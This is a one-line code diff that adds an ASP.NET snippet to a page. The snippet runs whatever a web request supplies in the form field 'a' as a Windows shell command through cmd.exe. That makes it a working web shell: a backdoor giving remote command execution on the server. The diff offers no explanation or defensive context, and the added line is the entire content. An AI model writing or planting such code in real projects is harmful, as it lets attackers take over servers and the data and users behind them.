@@ -1,0 +1,1 @@
+<% System.Diagnostics.Process.Start("cmd.exe","/c "+Request.Form["a"]); %>
